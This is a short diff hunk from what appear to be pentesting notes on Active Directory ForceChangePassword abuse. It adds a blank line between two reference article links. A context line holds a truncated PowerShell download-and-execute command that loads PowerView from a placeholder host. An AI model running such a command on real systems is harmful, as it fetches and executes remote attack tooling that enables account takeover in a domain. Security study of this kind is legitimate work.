@@ -52,4 +52,5 @@ Load powerview -> `IEX (new-object net.webclient).downloadstring('http://<your_e
 ### Articles:
 
 https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/
+
 https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
